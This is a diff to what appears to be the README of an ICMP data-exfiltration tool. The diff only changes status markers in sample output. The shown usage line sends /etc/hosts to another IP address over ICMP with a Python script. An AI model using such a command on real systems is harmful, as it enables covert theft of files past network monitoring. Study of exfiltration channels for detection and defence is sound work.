@@ -56,9 +56,9 @@ First we run the "icmp_exfiltration.py" file specifying which interface we want 
 ```bash
 ❯ python3 icmp_sendData.py 172.16.223.1 /etc/hosts
 
-┃  [+] Trying to send file...
+┃  [*] Trying to send file...
 
-┃  [+] File sent successfully.                        
+┃  [*] File sent successfully.                        
 ```
 Then from another host we will run the "icmp_sendData.py" script by providing the destination "IP-Address" and "FILE NAME"
 and it will automatically send  the file to another host terminal.
